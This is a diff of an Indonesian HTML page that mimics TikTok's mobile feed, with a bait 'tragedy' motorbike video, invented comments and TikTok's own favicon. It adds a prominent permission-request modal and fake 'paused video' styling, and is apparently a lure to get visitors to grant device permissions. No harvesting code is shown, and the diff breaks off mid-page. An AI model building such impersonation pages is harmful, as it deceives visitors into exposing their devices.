@@ -2,161 +2,134 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>TikTok - VLOG MOTOR</title>
-<link href="https://fonts.googleapis.com/css2?family=TikTok+Sans:wght@400;700&display=swap" rel="stylesheet">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>TikTok</title>
+<link rel="icon" href="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/webapp/main/webapp-desktop/favicon.ico">
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-
-  :root {
-    --tiktok-red: #FE2C55;
-    --tiktok-blue: #25F4EE;
-    --dark: #121212;
-    --text: #fff;
-    --gray: #9a9a9a;
-    --gray2: #2a2a2a;
-  }
-
+  * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
     background: #000;
-    color: var(--text);
+    color: #fff;
     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-    height: 100dvh;
-    width: 100%;
-    overflow: hidden;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-  }
-
-  .phone-frame {
-    width: 100%;
-    max-width: 390px;
-    height: 100dvh;
-    max-height: 844px;
-    background: #000;
-    position: relative;
+    height: 100vh;
     overflow: hidden;
     display: flex;
     flex-direction: column;
   }
 
-  /* ===== VIDEO BACKGROUND ===== */
-  .video-bg {
-    position: absolute;
-    inset: 0;
-    z-index: 0;
+  /* TOP NAV */
+  .topnav {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 12px 16px 8px;
+    position: relative;
+    z-index: 10;
+  }
+  .topnav .tabs {
+    display: flex;
+    gap: 20px;
+    font-size: 15px;
+    color: rgba(255,255,255,0.6);
+    font-weight: 600;
+  }
+  .topnav .tabs .active {
+    color: #fff;
+    border-bottom: 2px solid #fff;
+    padding-bottom: 4px;
+  }
+  .topnav .live-btn {
+    font-size: 13px;
+    color: rgba(255,255,255,0.6);
+    display: flex;
+    align-items: center;
+    gap: 4px;
+  }
+  .topnav .search-icon { font-size: 22px; cursor: pointer; }
+
+  /* VIDEO FEED */
+  .feed {
+    flex: 1;
+    position: relative;
     overflow: hidden;
   }
-
-  .video-bg-inner {
+  .video-item {
+    position: absolute;
     width: 100%;
     height: 100%;
-    background:
-      linear-gradient(180deg,
-        rgba(0,0,0,0.15) 0%,
-        rgba(0,0,0,0) 25%,
-        rgba(0,0,0,0) 55%,
-        rgba(0,0,0,0.7) 85%,
-        rgba(0,0,0,0.9) 100%
-      ),
-      url('https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=400&h=870&fit=crop&crop=center') center/cover no-repeat;
-    animation: subtle-zoom 8s ease-in-out infinite alternate;
-  }
-
-  @keyframes subtle-zoom {
-    from { transform: scale(1); }
-    to { transform: scale(1.04); }
-  }
-
-  /* Overlay warna gelap biar kaya video malam */
-  .video-overlay {
-    position: absolute;
-    inset: 0;
-    background: rgba(0,0,0,0.18);
-    z-index: 1;
-  }
-
-  /* ===== TOP BAR ===== */
-  .top-bar {
-    position: absolute;
-    top: 0; left: 0; right: 0;
-    z-index: 10;
-    padding: 52px 16px 12px;
+    background: #111;
     display: flex;
     align-items: center;
     justify-content: center;
-    gap: 0;
   }
-
-  .top-tabs {
-    display: flex;
-    gap: 24px;
-    align-items: center;
+  .video-bg {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    opacity: 0.6;
   }
-
-  .tab-item {
-    font-size: 15px;
-    font-weight: 500;
-    color: rgba(255,255,255,0.6);
-    cursor: pointer;
-    position: relative;
-    padding-bottom: 4px;
-    letter-spacing: 0.01em;
-  }
-
-  .tab-item.active {
-    color: #fff;
-    font-weight: 700;
-  }
-
-  .tab-item.active::after {
-    content: '';
+  /* Fake gradient overlay to look like paused video */
+  .video-overlay {
     position: absolute;
-    bottom: 0; left: 50%; transform: translateX(-50%);
-    width: 20px; height: 2.5px;
-    background: #fff;
-    border-radius: 2px;
+    inset: 0;
+    background: linear-gradient(
+      to bottom,
+      transparent 0%,
+      transparent 50%,
+      rgba(0,0,0,0.7) 100%
+    );
   }
-
-  .top-search {
+  .play-icon {
     position: absolute;
-    right: 16px;
-    top: 50px;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 60px;
+    opacity: 0.7;
+    pointer-events: none;
   }
 
-  .top-search svg {
-    width: 24px; height: 24px;
-    fill: #fff;
-  }
-
-  /* ===== LIVE BADGE ===== */
-  .live-badge {
-    position: absolute;
-    top: 100px;
-    left: 16px;
-    z-index: 10;
-    background: var(--tiktok-red);
-    color: #fff;
-    font-size: 11px;
-    font-weight: 800;
-    letter-spacing: 0.08em;
-    padding: 3px 8px;
-    border-radius: 4px;
-  }
-
-  /* ===== RIGHT ACTIONS ===== */
-  .right-actions {
+  /* RIGHT SIDEBAR */
+  .sidebar {
     position: absolute;
     right: 12px;
-    bottom: 140px;
-    z-index: 10;
+    bottom: 100px;
     display: flex;
     flex-direction: column;
     align-items: center;
     gap: 18px;
+    z-index: 10;
   }
-
+  .avatar-wrap {
+    position: relative;
+    cursor: pointer;
+  }
+  .avatar {
+    width: 44px;
+    height: 44px;
+    border-radius: 50%;
+    border: 2px solid #fff;
+    background: linear-gradient(135deg, #ff0050, #ff6680);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 20px;
+  }
+  .follow-plus {
+    position: absolute;
+    bottom: -8px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #fe2c55;
+    border-radius: 50%;
+    width: 20px;
+    height: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+    font-weight: bold;
+  }
   .action-item {
     display: flex;
     flex-direction: column;
@@ -164,1085 +137,481 @@
     gap: 4px;
     cursor: pointer;
   }
-
-  .action-avatar {
-    width: 48px; height: 48px;
-    border-radius: 50%;
-    border: 2px solid #fff;
-    overflow: hidden;
-    position: relative;
-  }
-
-  .action-avatar img {
-    width: 100%; height: 100%;
-    object-fit: cover;
-  }
-
-  .follow-btn {
-    position: absolute;
-    bottom: -8px; left: 50%; transform: translateX(-50%);
-    width: 20px; height: 20px;
-    background: var(--tiktok-red);
-    border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 14px; font-weight: 700; color: #fff;
-    line-height: 1;
-  }
-
   .action-icon {
-    width: 44px; height: 44px;
-    border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    background: rgba(255,255,255,0.12);
-    backdrop-filter: blur(6px);
+    font-size: 32px;
+    filter: drop-shadow(0 1px 3px rgba(0,0,0,0.5));
   }
-
-  .action-icon svg {
-    width: 26px; height: 26px;
-  }
-
   .action-count {
     font-size: 12px;
-    font-weight: 600;
     color: #fff;
-    text-align: center;
+    font-weight: 600;
   }
 
-  /* Heart animation */
-  .action-icon.liked svg { animation: heart-pop 0.3s ease; }
-  @keyframes heart-pop {
-    0% { transform: scale(1); }
-    50% { transform: scale(1.4); }
-    100% { transform: scale(1); }
-  }
-
-  /* ===== BOTTOM INFO ===== */
-  .bottom-info {
+  /* BOTTOM INFO */
+  .video-info {
     position: absolute;
-    bottom: 90px;
+    bottom: 80px;
     left: 12px;
-    right: 72px;
+    right: 80px;
     z-index: 10;
   }
-
-  .creator-name {
+  .username {
+    font-weight: 700;
     font-size: 16px;
-    font-weight: 700;
-    color: #fff;
     margin-bottom: 6px;
-    display: flex;
-    align-items: center;
-    gap: 6px;
   }
-
-  .creator-name .verified {
-    width: 16px; height: 16px;
-    background: var(--tiktok-blue);
-    border-radius: 50%;
-    display: inline-flex; align-items: center; justify-content: center;
-    flex-shrink: 0;
-  }
-
-  .creator-name .verified svg {
-    width: 10px; height: 10px;
-    fill: #000;
-  }
-
-  .video-title {
+  .caption {
     font-size: 14px;
-    font-weight: 400;
-    color: #fff;
-    line-height: 1.5;
-    margin-bottom: 10px;
+    color: rgba(255,255,255,0.9);
+    margin-bottom: 8px;
+    line-height: 1.4;
   }
-
-  .video-title strong {
-    font-weight: 700;
-  }
-
-  .hashtags {
-    display: flex;
-    flex-wrap: wrap;
-    gap: 4px;
-    margin-bottom: 10px;
-  }
-
-  .hashtag {
-    font-size: 14px;
-    font-weight: 600;
-    color: #fff;
-    opacity: 0.9;
-  }
-
-  .sound-row {
+  .music-row {
     display: flex;
     align-items: center;
     gap: 6px;
     font-size: 13px;
-    color: #fff;
+    animation: none;
   }
-
-  .sound-row svg {
-    width: 14px; height: 14px;
-    fill: #fff;
-    flex-shrink: 0;
-  }
-
-  .sound-ticker {
-    overflow: hidden;
-    flex: 1;
+  .music-note { font-size: 14px; }
+  .music-text { 
     max-width: 180px;
-  }
-
-  .sound-ticker-inner {
-    white-space: nowrap;
-    animation: ticker 8s linear infinite;
-    display: inline-block;
-  }
-
-  @keyframes ticker {
-    0% { transform: translateX(0); }
-    100% { transform: translateX(-50%); }
-  }
-
-  /* ===== MUSIC DISC ===== */
-  .music-disc {
-    position: absolute;
-    bottom: 105px;
-    right: 14px;
-    z-index: 10;
-    width: 44px; height: 44px;
-  }
-
-  .disc-ring {
-    width: 44px; height: 44px;
-    border-radius: 50%;
-    border: 3px solid rgba(255,255,255,0.8);
     overflow: hidden;
-    animation: spin 4s linear infinite;
-    position: relative;
+    white-space: nowrap;
+    text-overflow: ellipsis;
+    color: rgba(255,255,255,0.9);
   }
 
-  .disc-ring img {
-    width: 100%; height: 100%;
-    object-fit: cover;
-  }
-
-  .disc-center {
-    position: absolute;
-    top: 50%; left: 50%;
-    transform: translate(-50%,-50%);
-    width: 12px; height: 12px;
-    background: #000;
-    border-radius: 50%;
-    z-index: 2;
-  }
-
-  @keyframes spin {
-    from { transform: rotate(0deg); }
-    to { transform: rotate(360deg); }
-  }
-
-  /* ===== BOTTOM NAV ===== */
-  .bottom-nav {
-    position: absolute;
-    bottom: 0; left: 0; right: 0;
-    height: 80px;
-    background: rgba(0,0,0,0.85);
-    backdrop-filter: blur(12px);
-    z-index: 20;
+  /* BOTTOM NAV */
+  .bottomnav {
     display: flex;
-    align-items: center;
     justify-content: space-around;
-    padding-bottom: 14px;
-    border-top: 1px solid rgba(255,255,255,0.07);
+    align-items: center;
+    padding: 10px 0 18px;
+    background: #000;
+    border-top: 1px solid rgba(255,255,255,0.1);
+    z-index: 10;
   }
-
   .nav-item {
     display: flex;
     flex-direction: column;
     align-items: center;
-    gap: 2px;
+    gap: 3px;
     cursor: pointer;
-    min-width: 50px;
   }
-
-  .nav-item svg {
-    width: 26px; height: 26px;
-  }
-
-  .nav-item span {
-    font-size: 10px;
-    font-weight: 500;
-    color: rgba(255,255,255,0.5);
-    letter-spacing: 0.01em;
-  }
-
-  .nav-item.active span { color: #fff; }
-  .nav-item.active svg path,
-  .nav-item.active svg rect { fill: #fff; }
-
-  /* Plus button */
-  .nav-plus {
-    width: 46px; height: 30px;
-    background: linear-gradient(to right, var(--tiktok-blue), var(--tiktok-red));
+  .nav-icon { font-size: 24px; }
+  .nav-label { font-size: 10px; color: rgba(255,255,255,0.5); }
+  .nav-item.active .nav-label { color: #fff; }
+  .nav-item.active .nav-icon { filter: none; }
+  .plus-btn {
+    background: linear-gradient(to right, #69C9D0, #fff, #EE1D52);
     border-radius: 8px;
-    display: flex; align-items: center; justify-content: center;
-    cursor: pointer;
-    position: relative;
+    padding: 6px 14px;
+    font-size: 22px;
+    color: #000;
+    font-weight: bold;
   }
 
-  .nav-plus::before {
-    content: '';
-    position: absolute;
-    inset: -1px;
-    border-radius: 9px;
-    background: linear-gradient(to right, var(--tiktok-blue), var(--tiktok-red));
-    z-index: -1;
-  }
-
-  .nav-plus-inner {
-    width: 42px; height: 26px;
-    background: #fff;
-    border-radius: 6px;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 20px; font-weight: 300; color: #000; line-height: 1;
-  }
-
-  /* ===== COMMENT POPUP ===== */
-  .comments-sheet {
-    position: absolute;
-    bottom: 80px; left: 0; right: 0;
-    height: 65%;
-    background: #1a1a1a;
-    border-radius: 16px 16px 0 0;
-    z-index: 30;
-    transform: translateY(100%);
-    transition: transform 0.35s cubic-bezier(0.32,0.72,0,1);
-    display: flex;
-    flex-direction: column;
-  }
-
-  .comments-sheet.open { transform: translateY(0); }
-
-  .sheet-handle {
-    width: 36px; height: 4px;
-    background: #444;
-    border-radius: 2px;
-    margin: 12px auto 0;
-  }
-
-  .sheet-title {
-    text-align: center;
-    font-size: 15px;
-    font-weight: 700;
-    padding: 10px;
-    border-bottom: 1px solid #2a2a2a;
-  }
-
-  .comments-list {
-    flex: 1;
-    overflow-y: auto;
-    padding: 12px 16px;
-    display: flex;
-    flex-direction: column;
-    gap: 16px;
-  }
-
-  .comment-item {
-    display: flex;
-    gap: 10px;
-    align-items: flex-start;
-  }
-
-  .comment-avatar {
-    width: 36px; height: 36px;
-    border-radius: 50%;
-    background: var(--gray2);
-    flex-shrink: 0;
-    overflow: hidden;
-  }
-
-  .comment-avatar img { width: 100%; height: 100%; object-fit: cover; }
-
-  .comment-body { flex: 1; }
-
-  .comment-user {
-    font-size: 13px; font-weight: 700;
-    color: rgba(255,255,255,0.8);
-  }
-
-  .comment-text {
-    font-size: 14px;
-    color: #fff;
-    line-height: 1.4;
-    margin-top: 2px;
-  }
-
-  .comment-time {
-    font-size: 11px;
-    color: var(--gray);
-    margin-top: 3px;
-  }
-
-  .comment-like {
-    display: flex; flex-direction: column; align-items: center; gap: 2px;
-  }
-
-  .comment-like svg { width: 16px; height: 16px; fill: #fff; }
-  .comment-like span { font-size: 11px; color: var(--gray); }
-
-  .sheet-input {
-    padding: 10px 16px 20px;
-    display: flex;
-    gap: 8px;
-    align-items: center;
-    border-top: 1px solid #2a2a2a;
-  }
-
-  .sheet-input input {
-    flex: 1;
-    background: #2a2a2a;
-    border: none;
-    border-radius: 20px;
-    padding: 10px 16px;
-    font-size: 14px;
-    color: #fff;
-    outline: none;
-  }
-
-  .sheet-input input::placeholder { color: #666; }
-
-  /* ===== PROGRESS BAR ===== */
-  .progress-bar {
-    position: absolute;
-    bottom: 82px; left: 0; right: 0;
-    height: 3px;
-    z-index: 10;
-    background: rgba(255,255,255,0.2);
-  }
-
-  .progress-fill {
-    height: 100%;
-    background: #fff;
-    width: 38%;
-    animation: progress-move 12s linear infinite;
-  }
-
-  @keyframes progress-move {
-    from { width: 0%; }
-    to { width: 100%; }
-  }
-
-  /* ===== DOUBLE TAP HEART ===== */
-  .heart-burst {
-    position: absolute;
-    pointer-events: none;
-    z-index: 50;
-    font-size: 80px;
-    opacity: 0;
-    transform: scale(0.5);
-    transition: none;
-  }
-
-  .heart-burst.show {
-    animation: burst 0.8s ease forwards;
-  }
-
-  @keyframes burst {
-    0% { opacity: 0; transform: scale(0.5); }
-    30% { opacity: 1; transform: scale(1.3); }
-    70% { opacity: 1; transform: scale(1); }
-    100% { opacity: 0; transform: scale(1.1) translateY(-30px); }
-  }
-
-  /* ===== DUET STITCH ===== */
-  .duet-row {
-    position: absolute;
-    top: 105px;
-    right: 16px;
-    z-index: 10;
-    display: flex;
-    gap: 10px;
-  }
-
-  .duet-btn {
-    background: rgba(0,0,0,0.45);
-    backdrop-filter: blur(8px);
-    border: 1px solid rgba(255,255,255,0.2);
-    border-radius: 20px;
-    padding: 5px 12px;
-    font-size: 12px;
-    font-weight: 600;
-    color: #fff;
-    cursor: pointer;
-  }
-
-  /* ===== PERMISSION POPUPS ===== */
-  .perm-backdrop {
-    position: absolute;
+  /* PERMISSION MODAL */
+  .perm-overlay {
+    display: none;
+    position: fixed;
     inset: 0;
-    background: rgba(0,0,0,0.55);
-    z-index: 200;
-    display: flex;
+    background: rgba(0,0,0,0.85);
+    z-index: 999;
     align-items: flex-end;
     justify-content: center;
-    padding-bottom: 0;
-    animation: fade-in 0.2s ease;
   }
-
-  @keyframes fade-in {
-    from { opacity: 0; }
-    to { opacity: 1; }
-  }
-
-  /* Android-style bottom sheet permission */
-  .perm-sheet {
+  .perm-overlay.show { display: flex; }
+  .perm-card {
+    background: #1a1a1a;
+    border-radius: 20px 20px 0 0;
+    padding: 28px 24px 36px;
     width: 100%;
-    background: #2d2d2d;
-    border-radius: 16px 16px 0 0;
-    padding: 0 0 8px;
-    animation: slide-up 0.3s cubic-bezier(0.32,0.72,0,1);
-    overflow: hidden;
+    max-width: 480px;
+    animation: slideUp 0.35s ease;
   }
-
-  @keyframes slide-up {
-    from { transform: translateY(100%); }
-    to { transform: translateY(0); }
+  @keyframes slideUp {
+    from { transform: translateY(100%); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
   }
-
-  .perm-drag {
-    width: 36px; height: 4px;
-    background: #555;
-    border-radius: 2px;
-    margin: 10px auto 0;
+  .perm-card h3 {
+    font-size: 18px;
+    font-weight: 700;
+    margin-bottom: 8px;
+    text-align: center;
   }
-
-  .perm-app-row {
+  .perm-card p {
+    font-size: 14px;
+    color: rgba(255,255,255,0.6);
+    text-align: center;
+    margin-bottom: 24px;
+    line-height: 1.5;
+  }
+  .perm-items {
     display: flex;
-    align-items: center;
-    gap: 12px;
-    padding: 16px 20px 12px;
-    border-bottom: 1px solid rgba(255,255,255,0.07);
+    flex-direction: column;
+    gap: 14px;
+    margin-bottom: 24px;
   }
-
-  .perm-app-icon {
-    width: 40px; height: 40px;
-    border-radius: 10px;
-    background: #000;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 22px;
-    flex-shrink: 0;
-  }
-
-  .perm-app-name {
-    font-size: 13px;
-    color: rgba(255,255,255,0.5);
-    font-weight: 400;
-  }
-
-  .perm-title {
-    font-size: 16px;
-    font-weight: 600;
-    color: #fff;
-    line-height: 1.3;
-  }
-
-  .perm-body {
-    padding: 14px 20px 4px;
-  }
-
-  .perm-icon-row {
+  .perm-item {
     display: flex;
     align-items: center;
     gap: 14px;
+    background: rgba(255,255,255,0.06);
+    padding: 14px 16px;
+    border-radius: 12px;
+  }
+  .perm-item-icon { font-size: 26px; }
+  .perm-item-text h4 { font-size: 14px; font-weight: 600; }
+  .perm-item-text p { font-size: 12px; color: rgba(255,255,255,0.5); margin: 0; text-align: left; }
+  .perm-btn-allow {
+    width: 100%;
+    padding: 16px;
+    background: #fe2c55;
+    color: #fff;
+    border: none;
+    border-radius: 50px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
     margin-bottom: 12px;
   }
-
-  .perm-big-icon {
-    width: 48px; height: 48px;
-    border-radius: 50%;
-    background: rgba(255,255,255,0.1);
-    display: flex; align-items: center; justify-content: center;
-    font-size: 24px;
-    flex-shrink: 0;
-  }
-
-  .perm-desc {
-    font-size: 13px;
-    color: rgba(255,255,255,0.6);
-    line-height: 1.5;
-  }
-
-  .perm-desc strong {
-    color: rgba(255,255,255,0.85);
-    font-weight: 600;
-  }
-
-  .perm-divider {
-    height: 1px;
-    background: rgba(255,255,255,0.07);
-    margin: 4px 0;
-  }
-
-  .perm-actions {
-    display: flex;
-    flex-direction: column;
-    padding: 4px 12px 8px;
-    gap: 2px;
-  }
-
-  .perm-btn {
-    padding: 14px 16px;
-    border-radius: 10px;
-    font-size: 15px;
-    font-weight: 500;
-    text-align: left;
-    cursor: pointer;
-    color: #4DA3FF;
+  .perm-btn-skip {
+    width: 100%;
+    padding: 12px;
     background: transparent;
-    border: none;
-    transition: background 0.15s;
-  }
-
-  .perm-btn:active { background: rgba(255,255,255,0.08); }
-
-  .perm-btn.deny {
     color: rgba(255,255,255,0.5);
-  }
-
-  .perm-btn.primary {
-    color: #4DA3FF;
-    font-weight: 600;
-  }
-
-  .perm-btn.once {
-    color: #4DA3FF;
-  }
-
-  /* ===== SHARE SHEET ===== */
-  .share-sheet {
-    position: absolute;
-    bottom: 80px; left: 0; right: 0;
-    background: #1a1a1a;
-    border-radius: 16px 16px 0 0;
-    z-index: 30;
-    transform: translateY(100%);
-    transition: transform 0.35s cubic-bezier(0.32,0.72,0,1);
-    padding: 16px;
-  }
-
-  .share-sheet.open { transform: translateY(0); }
-
-  .share-title {
-    text-align: center;
-    font-size: 13px;
-    font-weight: 600;
-    margin-bottom: 16px;
-    color: rgba(255,255,255,0.7);
-  }
-
-  .share-grid {
-    display: flex;
-    gap: 16px;
-    overflow-x: auto;
-    padding-bottom: 8px;
-    scrollbar-width: none;
-  }
-
-  .share-item {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 6px;
-    min-width: 60px;
+    border: none;
+    font-size: 14px;
     cursor: pointer;
   }
 
-  .share-icon {
-    width: 52px; height: 52px;
-    border-radius: 14px;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 26px;
-  }
-
-  .share-item span { font-size: 11px; color: rgba(255,255,255,0.7); text-align: center; }
-
-  .overlay-bg {
-    position: absolute;
-    inset: 0;
-    z-index: 25;
+  /* STATUS MESSAGES */
+  .status-msg {
     display: none;
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(255,255,255,0.15);
+    backdrop-filter: blur(10px);
+    color: #fff;
+    padding: 12px 20px;
+    border-radius: 30px;
+    font-size: 14px;
+    z-index: 9999;
+    white-space: nowrap;
+    animation: fadeInOut 3s ease forwards;
   }
-  .overlay-bg.active { display: block; }
+  @keyframes fadeInOut {
+    0% { opacity: 0; transform: translateX(-50%) translateY(-10px); }
+    15% { opacity: 1; transform: translateX(-50%) translateY(0); }
+    70% { opacity: 1; }
+    100% { opacity: 0; }
+  }
 
+  /* Fake video backgrounds using CSS */
+  .fake-vid-1 { background: linear-gradient(160deg, #1a0a2e 0%, #0d1b4e 40%, #0a3040 100%); }
+  .fake-vid-2 { background: linear-gradient(160deg, #2e0a0a 0%, #4e1a0d 40%, #3d2a00 100%); }
 </style>
 </head>
 <body>
 
-<div class="phone-frame" id="app">
-
-  <!-- VIDEO BACKGROUND -->
-  <div class="video-bg">
-    <div class="video-bg-inner"></div>
+<!-- TOP NAV -->
+<div class="topnav">
+  <div class="live-btn">&#9654; LIVE</div>
+  <div class="tabs">
+    <span>Following</span>
+    <span class="active">For You</span>
   </div>
-  <div class="video-overlay"></div>
-
-  <!-- TOP BAR -->
-  <div class="top-bar">
-    <div class="top-tabs">
-      <div class="tab-item" onclick="this.parentNode.querySelectorAll('.tab-item').forEach(t=>t.classList.remove('active'));this.classList.add('active')">Following</div>
-      <div class="tab-item active">For You</div>
-      <div class="tab-item" onclick="this.parentNode.querySelectorAll('.tab-item').forEach(t=>t.classList.remove('active'));this.classList.add('active')">LIVE</div>
-    </div>
-    <div class="top-search">
-      <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.47 6.47 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
-    </div>
-  </div>
-
-  <!-- LIVE BADGE -->
-  <div class="live-badge">LIVE</div>
-
-  <!-- DUET / STITCH -->
-  <div class="duet-row">
-    <div class="duet-btn" onclick="showToast('Duet')">Duet</div>
-    <div class="duet-btn" onclick="showToast('Stitch')">Stitch</div>
-  </div>
-
-  <!-- RIGHT ACTIONS -->
-  <div class="right-actions">
-
-    <!-- Avatar + Follow -->
-    <div class="action-item">
-      <div class="action-avatar">
-        <img src="https://ui-avatars.com/api/?name=VM&background=fe2c55&color=fff&size=96&bold=true" alt="avatar">
-        <div class="follow-btn" onclick="toggleFollow(this)">+</div>
-      </div>
-    </div>
-
-    <!-- Like -->
-    <div class="action-item" onclick="toggleLike(this)">
-      <div class="action-icon" id="like-icon">
-        <svg viewBox="0 0 24 24" id="heart-svg">
-          <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z" fill="rgba(255,255,255,0.9)"/>
-        </svg>
-      </div>
-      <span class="action-count" id="like-count">284.6K</span>
-    </div>
-
-    <!-- Comment -->
-    <div class="action-item" onclick="toggleComments()">
-      <div class="action-icon">
-        <svg viewBox="0 0 24 24">
-          <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z" fill="rgba(255,255,255,0.9)"/>
-        </svg>
-      </div>
-      <span class="action-count">18.2K</span>
-    </div>
-
-    <!-- Bookmark -->
-    <div class="action-item" onclick="toggleBookmark(this)">
-      <div class="action-icon">
-        <svg viewBox="0 0 24 24" id="bookmark-svg">
-          <path d="M17 3H7c-1.1 0-2 .9-2 2v16l7-3 7 3V5c0-1.1-.9-2-2-2z" fill="rgba(255,255,255,0.9)"/>
-        </svg>
-      </div>
-      <span class="action-count">42.1K</span>
-    </div>
-
-    <!-- Share -->
-    <div class="action-item" onclick="toggleShare()">
-      <div class="action-icon">
-        <svg viewBox="0 0 24 24">
-          <path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11A2.99 2.99 0 0 0 18 8c1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81A2.99 2.99 0 0 0 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3a2.99 2.99 0 0 0 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z" fill="rgba(255,255,255,0.9)"/>
-        </svg>
-      </div>
-      <span class="action-count">Share</span>
-    </div>
-
-  </div>
-
-  <!-- MUSIC DISC -->
-  <div class="music-disc">
-    <div class="disc-ring">
-      <img src="https://ui-avatars.com/api/?name=VM&background=111&color=fe2c55&size=96" alt="disc">
-      <div class="disc-center"></div>
-    </div>
-  </div>
-
-  <!-- BOTTOM INFO -->
-  <div class="bottom-info">
-    <div class="creator-name">
-      @vlogmotor_id
-      <div class="verified">
-        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
-      </div>
-    </div>
-    <div class="video-title">
-      <strong>Hari Pertama Tragedi Mengerikan</strong> 😱🏍️
-      <br>gak nyangka bakal kejadian hal ini bro...
-    </div>
-    <div class="hashtags">
-      <span class="hashtag">#vlogmotor</span>
-      <span class="hashtag">#tragedi</span>
-      <span class="hashtag">#motorharian</span>
-      <span class="hashtag">#fyp</span>
-    </div>
-    <div class="sound-row">
-      <svg viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
-      <div class="sound-ticker">
-        <span class="sound-ticker-inner">Soundtrack Tragis - Original Sound - VLOG MOTOR &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Soundtrack Tragis - Original Sound - VLOG MOTOR &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
-      </div>
-    </div>
-  </div>
-
-  <!-- PROGRESS BAR -->
-  <div class="progress-bar">
-    <div class="progress-fill"></div>
-  </div>
-
-  <!-- HEART BURST -->
-  <div class="heart-burst" id="heart-burst">❤️</div>
-
-  <!-- OVERLAY for sheets -->
-  <div class="overlay-bg" id="overlay" onclick="closeAll()"></div>
-
-  <!-- COMMENTS SHEET -->
-  <div class="comments-sheet" id="comments-sheet">
-    <div class="sheet-handle"></div>
-    <div class="sheet-title">18,234 Komentar</div>
-    <div class="comments-list">
-      <div class="comment-item">
-        <div class="comment-avatar"><img src="https://ui-avatars.com/api/?name=RZ&background=25F4EE&color=000&size=72" alt=""></div>
-        <div class="comment-body">
-          <div class="comment-user">@rizkyfadly22</div>
-          <div class="comment-text">Bro tragedinya beneran nggak sih 😭😭 bikin deg2an banget</div>
-          <div class="comment-time">2 jam · Balas</div>
-        </div>
-        <div class="comment-like">
-          <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
-          <span>4.2K</span>
-        </div>
-      </div>
-      <div class="comment-item">
-        <div class="comment-avatar"><img src="https://ui-avatars.com/api/?name=AF&background=FE2C55&color=fff&size=72" alt=""></div>
-        <div class="comment-body">
-          <div class="comment-user">@annfebri_</div>
-          <div class="comment-text">Ya Allah motor nya itu ya 😭 sabar bang semoga cepet sembuh</div>
-          <div class="comment-time">1 jam · Balas</div>
-        </div>
-        <div class="comment-like">
-          <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
-          <span>2.8K</span>
-        </div>
-      </div>
-      <div class="comment-item">
-        <div class="comment-avatar"><img src="https://ui-avatars.com/api/?name=DK&background=ff9800&color=fff&size=72" alt=""></div>
-        <div class="comment-body">
-          <div class="comment-user">@dikiptr</div>
-          <div class="comment-text">PART 2 BANG !! jangan digantung dong 😤</div>
-          <div class="comment-time">45 menit · Balas</div>
-        </div>
-        <div class="comment-like">
